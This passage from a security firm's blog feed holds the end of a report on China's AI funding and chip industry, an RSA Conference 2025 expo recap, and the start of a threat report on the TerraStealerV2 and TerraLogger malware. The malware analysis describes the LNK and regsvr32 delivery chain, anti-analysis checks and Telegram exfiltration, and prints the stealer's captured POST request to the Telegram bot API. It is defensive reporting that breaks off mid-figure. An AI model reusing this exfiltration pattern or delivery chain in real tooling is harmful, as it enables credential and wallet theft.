href="https://www.businessinsider.com/big-tech-ai-capex-spend-meta-google-amazon-microsoft-earnings-2025-2" target="_blank">projected to reach over $320 billion</a> in 2025, and influencing <a href="https://cdn.openai.com/global-affairs/ostp-rfi/ec680b75-d539-4653-b297-8bcf6e5f7686/openai-response-ostp-nsf-rfi-notice-request-for-information-on-the-development-of-an-artificial-intelligence-ai-action-plan.pdf" target="_blank">opinions</a> on issues like AI regulation.</p><p>Maintaining an accurate threat perception of Chinese AI will almost certainly be key for major business and national security decision-makers in the US and its partners in the coming years. Despite the public perception of sudden and opaque progress via the lens of a &quot;Sputnik moment,&quot; the development of Chinas AI ecosystem almost certainly bears the fruit of long-term investments, iterative innovation, and the necessity for efficiency gains in the face of hardened chip export controls. </p><h2 id="chinas-ai-industry-and-landscape">Chinas AI Industry and Landscape</h2><p>In July 2017, Chinas State Council <a href="https://web.archive.org/web/20250303185319/http://www.gov.cn/zhengce/content/2017-07/20/content_5211996.htm" target="_blank">issued</a> the &quot;New Generation Artificial Intelligence Development Plan&quot; (AIDP; ), which outlined an ambitious path to <a href="https://digichina.stanford.edu/work/full-translation-chinas-new-generation-artificial-intelligence-development-plan-2017/" target="_blank">achieving</a> &quot;world-leading&quot; AI theories, technologies, and applications and becoming the &quot;worlds primary AI innovation center&quot; by 2030. To achieve these goals, the AIDP calls (in part) for the activities listed below. The AIDP also outlined key challenges China faced at the time  and to some extent continues to face  including a lack of breakthroughs in basic AI theory, algorithms, high-end chips, and other resources and outputs. Since that time, Chinese universities and businesses have become increasingly involved in AI conferences at the frontiers of AI research and have released hundreds of generative AI models. At the same time, Chinas semiconductor industry is steadily advancing its capabilities in spite of international restrictions.</p><p>According to the AIDP, China would seek  and in many ways has begun, as documented in this report  to:</p><ul><li>Support a development framework that enables industry, academia, and other sectors to pursue joint and cross-disciplinary innovation</li><li>Seek breakthroughs in R&amp;D, applications, and overall industry, including along the AI-relevant industrial chain</li><li>Improve training and recruitment of talent, focusing on AI specifically as well as AIs application in other fields</li><li>Promote AI applications and AI-related innovations across industries, enterprises, and services</li><li>Coordinate support for AI across Chinas main science and technology (S&amp;T) pillars, including key programs, megaprojects, bases, and talent plans</li><li>Adopt a system of laws, regulations, and norms to aid the development of AI</li><li>Disseminate news of Chinas AI progress to foster a society enthusiastic about, and supportive of, AI development</li></ul><p>Chinas S&amp;T innovation <a href="https://scsp222.substack.com/p/the-missing-piece-in-chinas-innovation" target="_blank">apparatus</a> very likely <a href="https://web.archive.org/web/20240618141413/https://mp.weixin.qq.com/s/NZxXb-LTiM3-PY4M36_VSA" target="_blank">emphasizes</a> (though it is perceived to be deficient in) collaboration among government  including laboratories and state-owned enterprises [SOE])  industry, and academia. Accordingly, entities from each of these sectors contribute to Chinas AI development enterprise.

For example, its <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/" target="_blank">OpenMMLab</a> is an &quot;open-source computer vision algorithm <a href="https://github.com/open-mmlab" target="_blank">system</a>&quot; that seeks to <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/" target="_blank">facilitate</a> academic and industry applications; it claims to have users from more than 100 countries and territories (<strong>Figure 1</strong> shows reported user affiliations). SHLABs website further <a href="https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus" target="_blank">asserts</a> strategic partnerships with at least thirteen universities across China.

In July 2023, Chinas National Artificial Intelligence Standardization General Working Group () announced the creation of a large model-focused working group () led by SHLAB and <a href="https://merics.org/en/report/chinas-ai-development-model-era-technological-deglobalization" target="_blank">comprising</a> the companies Baidu, Huawei, Qihoo 360, China Mobile, iFlytek, and Alibaba.</p><p><img src="https://cms.recordedfuture.com/uploads/us_china_ai_001_8c770a91d3.png" alt="us-china-ai-001.png"><em><strong>Figure 1:</strong> Institutions reportedly using or affiliated with users of OpenMMLab as of September 2024 (Source: <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/" target="_blank">OpenMMLab</a>)</em></p><p>According to information <a href="https://web.archive.org/web/20250108233824/https://www.cac.gov.cn/2024-04/02/c_1713729983803145.htm" target="_blank">released</a> by the Cyberspace Administration of China, 302 generative AI service models are fully <a href="https://web.archive.org/web/20250203172535/https://www.stdaily.com/web/gdxw/2025-01/09/content_284094.html" target="_blank">registered</a> in China as of January 2025.

Faced with explicit efforts by the US to curtail Chinas advances in both AI and semiconductors, Chinas support  including financial support  for the domestic semiconductor industry has almost certainly accelerated. One vehicle of state-led investment, the <a href="https://www.reuters.com/technology/china-sets-up-475-bln-state-fund-boost-semiconductor-industry-2024-05-27/" target="_blank">multi-phase</a> China Integrated Circuit Industry Investment Fund (&quot;Big Fund&quot;; ) had minority <a href="https://thechinaproject.com/2023/02/03/chinas-top-10-semiconductor-firms/" target="_blank">ownership</a> in at least 74 domestic semiconductor companies as of February 2023. Huawei is a particularly important and rising <a href="https://merics.org/en/report/huawei-quietly-dominating-chinas-semiconductor-supply-chain" target="_blank">contributor</a> to Chinas semiconductor industry, but multiple Chinese companies are making progress or experimenting with methods (<strong>Table 2</strong>) that  while far from cutting-edge capabilities and likely currently insufficient for domestic demand  likely have the potential to alleviate Chinas dependence on the US and others in the long term. In March 2025, Bloomberg reported (citing unnamed sources) that Chinas Ant Group had <a href="https://www.bloomberg.com/news/articles/2025-03-24/jack-ma-backed-ant-touts-ai-breakthrough-built-on-chinese-chips" target="_blank">found</a> a way to train AI models using domestically produced chips at a cheaper cost but with similar results compared to those obtained by using US chips.</p><table style="width:100%; border-collapse:collapse; table-layout:fixed;">  <tr>      <th style="border:1px solid #000; padding:8px; word-wrap:break-word; text-align:left;"><strong>Chinas Semiconductor Development</strong></th>  </tr>  <tr>    <td style="border:1px solid #000; padding:8px; word-wrap:break-word; text-align:left;"><strong>Huawei is now mass-producing 7-nanometer (nm) Ascend 910B and 910C AI chips</strong>, marking significant progress despite yield rates reportedly at only 40%  though Huaweis yield was reportedly at 20% only a year before.</td>  </tr>      <tr>    <td style="border:1px solid #000; padding:8px; word-wrap:break-word; text-align:left;"><strong>China is now forecasted to become the worlds single largest source of IC wafer manufacturing by 2026</strong>, likely led by growth in 12-inch wafer fabs by Big Fund investees like Semiconductor Manufacturing International Corporation (SMIC), Hua Hong Semiconductor, Runpeng Semiconductor (, a subsidiary of China Resources Microelectronics), Tiancheng Advanced (), Yandong Microelectronics (), and Zensemi ().    </td>  </tr>      <tr>    <td style="border:1px solid #000; padding:8px; word-wrap:break-word; text-align:left;"><strong>Chinese companies are currently exploring alternative techniques to manufacture extreme ultraviolet (EUV) lithography equipment,</strong> with patents by the Harbin Institute of Technology () and Shanghai Micro Electronics Equipment (SMEE, "") exploring laser-induced discharge plasma (LDP, "") and laser-produced plasma (LPP, "") EUV sources, respectively. </td>  </tr>      <tr>    <td style="border:1px solid #000; padding:8px; word-wrap:break-word; text-align:left;"><strong>China is progressing on domestic production of deep ultraviolet (DUV) lithography equipment,</strong> including recent breakthroughs in domestic manufacturing of DUV photoresists by Hubei Dinglong () and Shenzhen Rongda ().</td>  </tr></table><em><strong>Table 2:</strong> Evidence of development and milestones in Chinas domestic semiconductor industry (Source: Insikt Group)</em><br><br>Economic espionage, whether state-led or otherwise, also very likely supports Chinas progress in advancing its AI and semiconductor industries. It would be inaccurate to attribute all progress to this activity, but government-directed and tacitly allowed espionage almost certainly remains an important instrument in Chinas <a href="https://www.uscc.gov/sites/default/files/2025-02/Kyle_Chan_Testimony.pdf" target="_blank">toolkit</a> for achieving modernization. In October 2023, intelligence leaders of the Five Eyes alliance <a href="https://www.reuters.com/world/five-eyes-intelligence-chiefs-warn-chinas-theft-intellectual-property-2023-10-18/" target="_blank">noted</a> AI as one sector targeted by Chinas illicit actions. In February 2025, the US Department of Justice <a href="https://www.justice.gov/opa/pr/superseding-indictment-charges-chinese-national-relation-alleged-plan-steal-proprietary-ai" target="_blank">indicted</a> a former software engineer at Google over alleged attempts between mid-2022 and mid-2023 to steal proprietary information on hardware and software enabling supercomputing in support of large AI models. The engineer allegedly intended to use the information to support his own and another early-stage AI-related company. In November 2024, a former employee of South Koreas SK Hynix Inc. was <a href="https://www.asiafinancial.com/sk-hynix-worker-jailed-for-stealing-chip-tech-korea-bizwire" target="_blank">convicted</a> of printing and seeking to retain proprietary documents on semiconductor manufacturing solutions in mid-2022, likely to <a href="https://web.archive.org/web/20240528140713/https://m.koreatimes.co.kr/pages/article.amp.asp?newsIdx=375511" target="_blank">facilitate</a> her role in a new position at Huawei. Although not always a form of espionage, Chinas AI sector very likely further benefits from concerted efforts to <a href="https://www.trendforce.com/news/2025/02/21/new-ai-talent-race-heats-up-in-china-as-xiaomi-bytedance-and-alibaba-compete-for-experts/" target="_blank">attract</a> and <a href="https://chinatalenttracker.cset.tech/" target="_blank">recruit</a> <a href="https://www.reuters.com/technology/china-quietly-recruits-overseas-chip-talent-us-tightens-curbs-2023-08-24/" target="_blank">foreign</a> <a href="https://cset.georgetown.edu/publication/gao-huajian-and-the-china-talent-returnee-question/" target="_blank">talent</a>. Additionally, there is <a href="https://www.theverge.com/news/601195/openai-evidence-deepseek-distillation-ai-data" target="_blank">evidence</a> that Chinese companies have circumvented foreign platforms terms of service to enhance their own models through model distillation techniques.<h3 id="government-and-venture-capital-vc-funding">Government and Venture Capital (VC) Funding</h3><p>Funding for AI-related technologies is likely on an upward <a href="https://web.archive.org/web/20250317132408/http://www.xinhuanet.com/fortune/20250313/a7cb29ba2b3a49f4a9ac9a7c57dac9eb/c.html" target="_blank">trajectory</a> in both the US and China as of early 2025. Direct comparisons are difficult due to definitional issues and  especially with regard to China  data intransparency, but US federal government funding for civilian (non-military) AI likely exceeds the Chinese central governments funding by up to several billion USD per year, especially in light of evidence of declining expenditure by Beijing until approximately 2023 (likely in part due to COVID-19). The balance of government-led investment when including activity at the state and provincial levels likely leans in Chinas favor, where guidance funds combine public and private capital to invest approximately $16 billion annually in likely AI-related companies (broadly defined). Total private-sector investment in AI companies in the US far outstrips private-sector investment in China.</p><p>According to Federal Budget IQ, the US federal government has <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/" target="_blank">increased</a> its AI and IT R&amp;D spending from $8.2 billion in 2021 to $10.4 billion in 2024, a nearly 27% increase. The 2025 fiscal year budget earmarked $11.2 billion for AI and IT R&amp;D spending. Removing spending by the US Department of Defense (DoD; $2.035 billion) and the Defense Advanced Research Projects Agency (DARPA; $1.41 billion), US federal spending on AI and IT R&amp;D for civilian applications represents approximately $7.33 billion. Within this, the budget for &quot;core&quot; AI ($1.955 billion) is the largest component, though funding for the likely AI-relevant area of high-capacity computing is also rising quickly. The US federal budget for &quot;core&quot; and &quot;cross-cut&quot; AI in fiscal year 2025 combined is $2.8 billion (excluding US DoD and DARPA).</p><p>In China, total central government funding for AI is much more opaque. <strong>Figure 2</strong> and <strong>Figure 3</strong> show likely AI-related investment in basic, applied, and experimental R&amp;D over recent years for two of Chinas <a href="https://www.uscc.gov/sites/default/files/2024-02/Ngor_Luong_Testimony.pdf" target="_blank">largest</a> government-run institutions: the National Natural Science Foundation of China (NSFC) and the Chinese Academy of Sciences (CAS). Specifically, <strong>Figure 3</strong> presents data from the budgets of three CAS institutes particularly <a href="https://cset.georgetown.edu/publication/fueling-chinas-innovation-the-chinese-academy-of-sciences-and-its-role-in-the-prcs-st-ecosystem/" target="_blank">focused</a> on AI. <strong>Figure 4</strong> shows notionally earmarked funds for research to be conducted under Chinas &quot;New Generation Artificial Intelligence&quot; Megaproject ( 2030&quot;&quot;). In addition to these data points and trends, the two organizations <a href="https://cset.georgetown.edu/publication/chinas-state-key-laboratory-system/" target="_blank">supervising</a> nearly half of Chinas state key labs (SKLs)  the Ministry of Education and CAS  cumulatively budgeted 2.4 billion RMB ($327 million) under associated R&amp;D line items. Of this, approximately 29% would go to SKLs in the information and communications technology field, assuming funds were distributed equally among all SKLs supervised by these organizations and not accounting for other known unknowns. </p><p>Insikt Groups review of the data summarized above and evidence from other central government funding channels leads us to a low-confidence estimate that Chinas central government spends on the order of several billion USD annually on likely AI-related R&amp;D, roughly similar to the US governments <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/#:~:text=For%20core%20AI%20funding%2C%20the,and%20Agriculture%20(%24104%20million)." target="_blank">spending</a> on &quot;core&quot; and &quot;cross-cut&quot; AI (excluding US DoD and DARPA). Because &quot;core&quot; and &quot;cross-cut&quot; AI have a clear definition and estimating Chinas funding relies on imperfect visibility into the research program it targets, it is likely that US federal government funding for AI is higher than that of Chinas central government. Total Chinese government-led investment in AI  via guidance funds  likely exceeds US cumulative federal and state investment, however (discussed further below). </p><p><img src="https://cms.recordedfuture.com/uploads/us_china_ai_002_063c348af2.png" alt="us-china-ai-002.png"><em><strong>Figure 2:</strong> NSFC National Natural Sciences Fund Information Science Department (ISD) R&amp;D expenditures (actual) for AI and automation, 20182024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></p><p><img src="https://cms.recordedfuture.com/uploads/us_china_ai_003_ed88293530.png" alt="us-china-ai-003.png"><em><strong>Figure 3:</strong> R&amp;D expenditures (20182023 actual; 2024 budgeted) for AI-focused CAS research institutes, 20182024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></p><p><img src="https://cms.recordedfuture.com/uploads/us_china_ai_004_3d4b413b70.png" alt="us-china-ai-004.png"><em><strong>Figure 4:</strong> Annual proposed funding for projects announced under the &quot;New Generation Artificial Intelligence&quot; Megaproject, 2018 and 20202022 (data not available for 2019; RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></p><p>The declining trend through the early 2020s is likely related to the impact of COVID-19 on Chinas economy, but should also be viewed cautiously given missing data from other central government funding channels. As of early 2025, central government actors have signaled increasing interest in AI. In January 2025, Bank of China <a href="https://web.archive.org/web/20250127130750/https://www.bankofchina.com/aboutboc/bi1/202501/t20250123_25254674.html" target="_blank">announced</a> a five-year plan for financially supporting the AI industry value chain with a minimum of one trillion RMB ($138 billion). In March 2025, Chinas National Development and Reform Commission <a href="https://archive.ph/7rzg6" target="_blank">announced</a> the establishment of a National Innovation Investment Guidance Fund (). The new fund is being dubbed an &quot;aircraft carrier-level&quot; () fund and will seek to raise one trillion RMB ($138.2 billion) while focusing investment on start-up, early-stage, small-, and medium-sized enterprises in &quot;frontier domains&quot; like AI, quantum science, and future energy. Indicating its focus on the concept of &quot;patient capital,&quot; the funds duration is being set at twenty years  reportedly about five years longer than most other guidance funds.</p><p>Government guidance funds, such as the one announced in March 2025, have been established at multiple levels of government in China and <a href="https://cset.georgetown.edu/publication/understanding-chinese-government-guidance-funds/" target="_blank">mix</a> funds from governmental and non-governmental sources (including corporate sources). This creates a challenge when attempting to isolate just central government funding. However, research published by the National Bureau of Economic Research (NBER) has <a href="https://www.nber.org/system/files/working_papers/w32701/w32701.pdf" target="_blank">found</a> that more broadly across central, provincial, and local governments, these guidance funds have &quot;invested in 9,623 unique AI firms through more than 20,000 transactions, in total 184 billion USD&quot; between 2000 and 2023, with the majority of transactions occurring since 2013. Annualizing this estimate over the 20132023 period points to an average spend of $16.7 billion per year, though the NBER studys method of identifying AI companies was very broad and potentially leads to an overestimate. There are state-level initiatives in the US, such as New Yorks Empire AI consortium that has received $565 million in <a href="https://www.governor.ny.gov/news/governor-hochul-unveils-fifth-proposal-2024-state-state-empire-ai-consortium-make-new-york" target="_blank">funding</a> from public and private <a href="https://govmarketnews.com/new-york-boosts-ai-research-with-165m-funding-package/" target="_blank">sources</a>, but they likely do not match sub-national funding in China, which is steadily increasing. In January 2025, two state-backed Chinese investment <a href="https://archive.ph/cjS4z" target="_blank">companies</a> <a href="https://archive.ph/RZBdk" target="_blank">announced</a> the creation of a National Artificial Intelligence Industry Investment Fund () with an initial registered capital of 60 billion RMB ($8.2 billion).</p><p>Although Chinas government may be ahead in terms of total AI investment  when the likely small lag in central government spending is compared to the likely larger lead in sub-national investment through guidance funds  total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China. This is seen in data (<strong>Figure 5</strong>) collected by both Stanford Universitys Center for Human-Centered Artificial Intelligence (Stanford HAI) and the Emerging Technology Observatory (ETO), a project under Georgetown Universitys Center for Security and Emerging Technology (CSET). Note that there is likely overlap between the aforementioned investments of Chinas guidance funds and the private-sector investment data; that is, this data likely does not exclude investments in AI companies that come from government sources. This private-sector investment data is narrower, however; ETOs data only reflects investments into 2,100 Chinese AI companies compared to the NBER studys over 9,000 companies.</p><p><img src="https://cms.recordedfuture.com/uploads/us_china_ai_005_02e8fac98a.png" alt="us-china-ai-005.png"><em><strong>Figure 5:</strong> Disclosed private-sector investment in China and the US, 20132023 (Sources: <a href="https://hai.stanford.edu/ai-index/2024-ai-index-report" target="_blank">Stanford HAI</a>; <a href="https://cat.eto.tech/?countries=China+%28mainland%29%2CUnited+States&countryGroups=&dataset=Investment&expanded=Summary-metrics%2CChanges-over-time" target="_blank">ETO</a>)</em></p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-2025-0508.pdf" target="_blank">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p>The 2025 RSA Conference in San Francisco once again showcased the cutting edge of cybersecurity innovation. This year&#39;s expo floor was particularly vibrant, reflecting how the industry continues to evolve in response to increasingly sophisticated threats. As I navigated the bustling halls, I noted key highlights and trends that are notable for the conference and shaping the security market.</p><h3 id="ai-assisted-security-operations">AI Assisted Security Operations</h3><p>The most prominent theme throughout the expo was the integration of advanced AI into security tools. This year&#39;s offerings demonstrated AI assisted capabilities that provide actionable intelligence and simplify complex tasks.Several vendors showcased platforms that went beyond just incorporating AI but now take actions to offload some of the work of security practitioners. When businesses need to do more with less along with the struggle to find security talent, this should go a long way.</p><h3 id="the-spectrum-of-threat-intelligence">The Spectrum of Threat Intelligence</h3><p>One thing that caught my eye when walking the expo floor was the number of vendors and booths displaying Threat Intelligence signage prominently on their displays and TVs. After talking to reps at the booths, it was clear that there is a wide spectrum of threat intelligence available, and it is important to know which type works best for you and asking what sort of threat intelligence the vendor is offering. One one end of the spectrum, you have some vendors are providing true first-party threat (first-party threat intelligencedata collected directly by the vendor through their own sensors, honeypots, and research teamsproviding unique visibility that can&#39;t be found elsewhere) intelligence, while the other end of the spectrum are vendors providing threat intelligence in their products that consists of the ability to take in an open source feed.</p><h3 id="animals-of-cybersecurity-marketing">Animals of Cybersecurity Marketing</h3><p>A big highlight of the expo were two vendors taking a decidedly analog approach to standing out on the crowded RSAC expo floor. Attendees could take a break from technical discussions to spend a few minutes cuddling the puppies who were available for adoption. Just across the room, a small pen of miniature goats complete with hay bales and &quot;Greatest Of All Time (GOAT)&quot; signage, created an effective contrast to the high-tech solutions being pitched. Both animal-themed booths proved that in the battle for attendee attention, sometimes the most effective strategy is simply offering a moment of joy amid the cybersecurity intensity.</p><p><img src="https://cms.recordedfuture.com/uploads/rsac_recap_001_7e1f1ab0cb.jpg" alt="rsac-recap-001.jpg"></p><p><img src="https://cms.recordedfuture.com/uploads/rsac_recap_002_b45674d1da.jpg" alt="rsac-recap-002.jpg"></p><h2 id="recorded-futures-branding-and-malware-intelligence-on-the-expo-floor">Recorded Futures Branding and Malware Intelligence on the Expo Floor</h2><p>A highlight for me was seeing Recorded Futures new brand on display front and center on the show floor with the new electric blue and bold red accent colors. The boldness of the brand stood out amid a sea of sameness  dark displays, matrix-like code animations, and ubiquitous hooded figures  and captured what Recorded Future is all about. When organizations are facing increasingly sophisticated threats, they need a bold partner that stands out from the others with clarity, focus, and actionable insights.</p><p><img src="https://cms.recordedfuture.com/uploads/rsac_recap_003_0006170bd7.jpg" alt="rsac-recap-003.jpg"></p><p>Coupling the new brand with the launch of Recorded Futures new Malware Intelligence offerings made the booth one of the must see stops as attendees made their way around the floor. Attendees were able to see demos of the product and see for themselves how Malware Intelligence helped achieve the following outcomes:</p><ul><li>Reduction in time spent analyzing malware samples</li><li>Automated malware detection at scale</li><li>Shift from reactive to proactive and spot emerging threats before they become a problem</li></ul><p><strong>The average team saves 11 hours weekly on threat analysis, hunting, and reporting efforts with Recorded Future Malware Intelligence (<a href="http://uevi.co/6959AEDT">Source</a>)</strong></p><p>The team also discussed the new capabilities available with Malware Intelligence including malware hunting, Auto YARA Rules, and malware Alerts. </p><p><img src="https://cms.recordedfuture.com/uploads/rsa_recap_004_dc75835b70.png" alt="rsa-recap-004.png"></p><p>Dont worry if you were unable to stop by the booth, you can find more information on Malware Intelligence on the new Recorded Future website at <a href="http://www.recordedfuture.com/malware-intelligence">www.recordedfuture.com/malware-intelligence</a>.</p><h2 id="looking-ahead">Looking Ahead</h2><p>As I left the expo floor, it was clear that the cybersecurity industry continues its march toward more integrated, intelligence-driven approaches. The vendors that stood out weren&#39;t those with the flashiest booths or the most aggressive marketingthey were those offering genuine advancements in connecting disparate security data points into coherent, actionable intelligence. As the conference comes to a close, it was great to hear all the new ideas, see the keynotes, and network with other security practitioners. I look forward to RSAC 2026 and I am curious what animals might be on the show floor next year.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>Insikt Group identified two new malware families  TerraStealerV2 and TerraLogger  linked to the financially motivated threat actor Golden Chickens (also known as Venom Spider). Golden Chickens is known for operating a Malware-as-a-Service (MaaS) platform used by cybercriminal groups such as FIN 6, Cobalt Group, and Evilnum. The new families, observed between January and April 2025, suggest ongoing development aimed at credential theft and keylogging.</p><p>TerraStealerV2 is designed to collect browser credentials, cryptocurrency wallet data, and browser extension information. While it targets the Chrome Login Data database to steal credentials, it does not bypass Application Bound Encryption (ABE) protections introduced in Chrome updates after July 2024, indicating the malware code is outdated or still under development. Data is exfiltrated to both Telegram and the domain wetransfers[.]io. The stealer has been observed being distributed via multiple formats, including LNK, MSI, DLL, and EXE files, and leverages trusted Windows utilities, such as regsvr32.exe and mshta.exe, to evade detection.</p><p>TerraLogger, by contrast, is a standalone keylogger. It uses a common low-level keyboard hook to record keystrokes and writes the logs to local files. However, it does not include functionality for data exfiltration or command-and-control (C2) communication, indicating it is either in early development or intended to be a modular part of the Golden Chickens MaaS ecosystem.</p><p>The current state of TerraStealerV2 and TerraLogger suggests that both tools remain under active development and do not yet exhibit the level of stealth typically associated with mature Golden Chickens tooling. Given Golden Chickens history of developing malware for credential theft and access operations, these capabilities will likely continue to evolve. Organizations are advised to follow the mitigation guidance provided in this report to reduce the risk of compromise as these malware families mature.</p><h2 id="key-findings">Key Findings</h2><ul><li>Insikt Group identified two new malware families, TerraStealerV2 and TerraLogger, attributed to the threat actor Golden Chickens. TerraStealerV2 can steal browser credentials and target cryptocurrency wallets, while TerraLogger functions solely as a standalone keylogger module.</li><li>TerraLogger is the first observed use of a keylogging capability within malware developed by Golden Chickens.</li><li>TerraStealerV2 lacks support for decrypting Chrome ABE-protected credentials, indicating the tool is likely outdated or still under development.</li><li>Insikt Group observed ten distinct TerraStealerV2 distribution samples between January and March 2025 that employed varied delivery methods, including MSI, DLL, and LNK files.</li></ul><h2 id="background">Background</h2><p>Golden Chickens, also tracked under the alias Venom Spider, is a financially motivated cyber threat actor known for operating a stealthy and modular malware suite under a MaaS model. Since <a href="https://www.esentire.com/resources/library/unmasking-venom-spider" target="_blank">at least</a> 2018, the Golden Chickens MaaS suite has been deployed in campaigns targeting high-value organizations through social engineering vectors, particularly spearphishing campaigns leveraging fake job offers or resumes. Notably, the malware is used by top-tier cybercrime groups, including Russia-based FIN6 and Cobalt Group, as well as the Belarus-based Evilnum, which has been <a href="https://www.esentire.com/resources/library/unmasking-venom-spider" target="_blank">linked</a> to damages of over $1.5 billion USD globally.</p><p>The core components of the Golden Chickens MaaS suite are VenomLNK and TerraLoader. Initial infections are typically achieved through VenomLNK, a malicious Windows shortcut file, which executes TerraLoader, a loader module responsible for deploying additional Golden Chickens malware. These modules include TerraStealer for credential harvesting, TerraTV for TeamViewer hijacking, and TerraCrypt for ransomware deployment. Additional malware families attributed to the Golden Chickens ecosystem include TerraRecon for reconnaissance, TerraWiper for data wiping, and lite_more_eggs, as depicted in Figure 1 below.</p><p><img src="https://cms.recordedfuture.com/uploads/Terra_Stealer_V2_001_a85a7e73ff.png" alt="TerraStealerV2-001.png"><em><strong>Figure 1:</strong> Previously reported Golden Chickens malware families (Source: <a href="https://quointelligence.eu/2020/01/the-chicken-keeps-laying-new-eggs-uncovering-new-gc-maas-tools-used-by-top-tier-threat-actors/" target="_blank">Quo Intelligence</a>)</em></p><p>Attribution efforts by eSentires Threat Response Unit have <a href="https://www.esentire.com/resources/library/unmasking-venom-spider" target="_blank">linked</a> Golden Chickens to a threat actor known as badbullzvenom, a persona that is believed to be operated jointly by individuals from Moldova and Montreal, Canada. The threat actors development history demonstrates progress from a low-level forum participant to an established MaaS provider. Tools developed by Golden Chickens have been <a href="https://www.esentire.com/resources/library/unmasking-venom-spider" target="_blank">weaponized</a> in several campaigns, including high-profile attacks on British Airways, Newegg, and Ticketmaster UK.</p><p>Between August and October 2024, Zscaler ThreatLabz <a href="https://www.zscaler.com/blogs/security-research/unveiling-revc2-and-venom-loader" target="_blank">observed</a> renewed activity attributed to Golden Chickens involving the deployment of two newly identified malware families: RevC2 and Venom Loader. These tools were delivered via VenomLNK campaigns, leveraging social engineering lures like cryptocurrency payment requests and software API documentation. <strong>Figure 2</strong> illustrates the attack chain used to deliver RevC2.</p><p><img src="https://cms.recordedfuture.com/uploads/Terra_Stealer_V2_002_d21c2d4a2a.png" alt="TerraStealerV2-002.png"><em><strong>Figure 2:</strong> Recent Golden Chickens attack chain used to deliver RevC2 (Source: <a href="https://www.zscaler.com/blogs/security-research/unveiling-revc2-and-venom-loader" target="_blank">ZScaler</a>)</em></p><p>While the initial delivery vector is not known, the infection sequence begins with the execution of a VenomLNK file. This file downloads a decoy image consistent with the lure theme (in this case, software API documentation) and initiates RevC2 execution. Specifically, the LNK file leverages <span style="font-family:courier;">wmic.exe</span> to invoke <span style="font-family:courier;">regsvr32.exe</span>, which loads a malicious OCX payload hosted on a remote network share.</p><h2 id="technical-analysis">Technical Analysis</h2><p>Insikt Group identified two new malware families attributed to the threat actor group Golden Chickens. The first, tracked as TerraStealerV2, is a stealer primarily targeting browser credentials, cryptocurrency wallets, and browser extensions. The second, tracked as TerraLogger, is a keylogger observed as a standalone module. The following subsections provide a detailed technical analysis of each malware family.</p><h3 id="terrastealerv2">TerraStealerV2</h3><p>Insikt Group recently identified a new stealer attributed to Golden Chickens, uploaded to Recorded Future Malware Intelligence on March 3, 2025. A Program Database (PDB) path embedded in the sample (see <strong>Figure 3</strong>) suggests the threat actor refers to the malware as NOK; however, Insikt Group tracks it as TerraStealerV2.</p><table><tbody><tr><td style="font-family:Courier New;background-color:#ffffff;">C:\Users\Admin\source\repos\NOK\NOK\x64\Release\NOK.pdb</td></tr></tbody></table><em><strong>Figure 3:</strong> TerraStealerV2 PDB string (Source: Recorded Future)</em><br><p>The stealer is intended to be delivered as an OCX file and executed via <span style="font-family:courier;">regsvr32.exe</span>, which invokes the <span style="font-family:courier;">DllRegisterServer</span> export function. Upon execution, <span style="font-family:courier;">DllRegisterServer</span> first checks that the provided file has a .ocx extension and that the filename ends with a specific hard-coded character or digit (for example, 0.ocx). It then verifies that the file is being run by <span style="font-family:courier;">regsvr32.exe</span> before proceeding, as illustrated in <strong>Figure 4</strong> below.</p><p><img src="https://cms.recordedfuture.com/uploads/Terra_Stealer_V2_003_e0b3640e79.png" alt="TerraStealerV2-003.png"><em><strong>Figure 4:</strong> Flow chart illustrating TerraStealerV2s anti-analysis checks (Source: Recorded Future)</em></p><p>The malware then performs string deobfuscation using an XOR decoding routine with a hard-coded key. It collects basic host information by invoking <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea" target="_blank">GetUserNameA</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea" target="_blank">GetComputerNameA</a> to retrieve the local user and system names. It then determines the victims IP address by making an HTTP request to <em>ifconfig[.]me</em>. The collected data is subsequently exfiltrated via the Telegram messaging platform to a channel named Noterdam using a bot token associated with NoterdanssBot, as shown in <strong>Figure 5</strong>.</p><table border="1" style="width: 100%; table-layout: fixed;">  <tr>    <td style="word-break: break-word;">      <pre style="font-family: 'Courier New', Courier, monospace; white-space: pre-wrap; word-break: break-word; max-width: 100%;">POST /< redacted >/sendMessage?chat_id=-4652754121 HTTP/1.1Host: api.telegram.orgAccept: */*Content-Length: 24014Content-Type: application/x-www-form-urlencoded</pre><br><br><pre style="font-family: 'Courier New', Courier, monospace; white-space: pre-wrap; word-break: break-word; max-width: 